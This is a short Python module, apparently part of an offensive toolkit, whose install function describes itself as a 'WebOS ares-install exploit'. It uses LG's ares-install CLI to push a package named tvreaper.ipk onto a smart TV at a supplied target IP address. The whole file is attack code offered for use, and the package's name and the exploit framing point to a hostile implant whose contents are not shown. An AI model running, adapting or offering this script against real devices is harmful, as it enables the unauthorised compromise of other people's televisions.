#!/usr/bin/env python3
import subprocess
import sys
import os
from core.utils import logger

def install(target_ip):
    logger.info(f"Attempting WebOS ares-install exploit on {target_ip}...")

    # CR-41 fix: os.system returns 0 when tool IS found.
    if os.system("which ares-install > /dev/null 2>&1") != 0:
        logger.error("LG ares-install CLI not found.")
        return False

    ipk_path = "resources/tvreaper.ipk"
    if not os.path.exists(ipk_path):
        logger.error(f"IPK file missing: {ipk_path}")
        return False

    try:
        result = subprocess.run(["ares-install", "--device", f"tv@{target_ip}", ipk_path],
                                timeout=180, capture_output=True)
        if result.returncode == 0:
            logger.info("IPK installed.")
            return True
        else:
            logger.error(f"Install failed: {result.stderr.decode()}")
            return False
    except subprocess.TimeoutExpired:
        logger.error("Install timeout.")
        return False
